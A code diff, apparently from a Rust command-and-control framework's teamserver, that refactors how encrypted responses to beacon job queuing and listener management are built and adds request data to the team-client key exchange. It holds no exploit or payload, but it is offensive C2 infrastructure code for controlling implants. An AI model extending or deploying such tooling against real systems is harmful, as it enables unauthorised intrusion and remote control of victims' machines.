@@ -22,9 +22,8 @@ use crate::utilities::beacondecoder::BeaconDecoder;
 use crate::webserver::{QUEUE, endpoints::*, endpoints::listeners::Listeners};
 
 use log::{debug, error, info};
-use serde_json::{json};
 use rsa::RsaPrivateKey;
-use actix_web::{web, HttpResponse, HttpServer, App};
+use actix_web::{web, HttpResponse, HttpRequest, HttpServer, App};
 
 pub struct ManagementServer;
 
@@ -79,8 +78,9 @@ async fn handle_mgmt_call(api: web::Path<String>, body: String, private_key: web
                     queue.commands.push((beacon.id(), beacon.res()));
                     debug!("Length of queue: {}", queue.commands.len());
 
-                    let response = format_response_payload(command, format!("Added job for: {}, Length of queue is now: {}", beacon.id(), queue.commands.len()), aes_key);
-                    return HttpResponse::Ok().body(response)
+                    let encoded_json = encode_in_json(command, format!("Added job for: {}, Length of queue is now: {}", beacon.id(), queue.commands.len()));
+                    let payload = format_payload(encoded_json, aes_key);
+                    return HttpResponse::Ok().body(payload)
                 }
             }
         },
@@ -104,8 +104,9 @@ async fn handle_mgmt_call(api: web::Path<String>, body: String, private_key: web
                             if let Ok(res) = Listeners::handle_listener_start(command.clone(), private_key.get_ref().clone()).await {
                                 // Res needs to be encrypted
 
-                                let response = format_response_payload(command.clone(), res, aes_key);
-                                return HttpResponse::Ok().body(response);
+                                let encoded_json = encode_in_json(command.clone(), res);
+                                let payload = format_payload(encoded_json, aes_key);
+                                return HttpResponse::Ok().body(payload);
                             }
                         },
                         "remove" => {
@@ -118,8 +119,9 @@ async fn handle_mgmt_call(api: web::Path<String>, body: String, private_key: web
                             // Getting all the active listeners
                             if let Ok(list) = Listeners::handle_listener_get().await {
                                 // List needs to be encrypted
-                                let response = format_response_payload(command, list, aes_key);
-                                return HttpResponse::Ok().body(response);
+                                let encoded_json = encode_in_json(command.clone(), list);
+                                let payload = format_payload(encoded_json, aes_key);
+                                return HttpResponse::Ok().body(payload);
                             }
                         },
                         _ => return HttpResponse::NotFound().into(), 
@@ -133,7 +135,7 @@ async fn handle_mgmt_call(api: web::Path<String>, body: String, private_key: web
     HttpResponse::NotFound().into()
 }
 
-async fn handle_key_exchange(action: web::Path<String>, body: String, username: web::Data<String>, password: web::Data<String>, private_key: web::Data<RsaPrivateKey>) -> HttpResponse {
+async fn handle_key_exchange(req: HttpRequest, action: web::Path<String>, body: String, username: web::Data<String>, password: web::Data<String>, private_key: web::Data<RsaPrivateKey>) -> HttpResponse {
     // Initial connections are not secure, this is why this function exists.
     // This functions serves the public key of the teamserver to encrypt a message
     // Retrieving the teamclients private key (through authentication)
@@ -150,6 +152,9 @@ async fn handle_key_exchange(action: web::Path<String>, body: String, username: 
                 password.get_ref().clone(), 
                 private_key.get_ref().clone()
             ) {
+                // Upon authentication the teamserver should add the peer_addr from "req" to it's TEAMCLIENT variable
+                // This will be used to broadcast the results from beacons to, otherwise the teamserver has no clue where to send data
+                
                 return HttpResponse::Ok().body(Base64::encode(&encrypted_private_key));
             }
         },
@@ -212,21 +217,4 @@ fn get_encrypted_private_key(body: String, username: String, password: String, p
     }
 
     Err(anyhow!(""))
-}
-
-fn format_response_payload(command: String, res: String, aes_key: [u8; 32]) -> String {
-    if let Ok(encoded_response) = encode_result_in_json(command, res) {
-        let encrypted_response = Aes::encrypt(aes_key, encoded_response.as_bytes().to_vec());
-        let encoded_encrypted_response = Base64::encode(&encrypted_response);
-        return encoded_encrypted_response
-    }
-    "Failed to format response payload".to_string()
-}
-
-fn encode_result_in_json(command: String, result: String) -> Result<String> {
-    let encoded_response = json!({
-        "command": format!("{}", command),
-        "result": format!("{}", result),
-    });
-    Ok(serde_json::to_string(&encoded_response)?)
 }
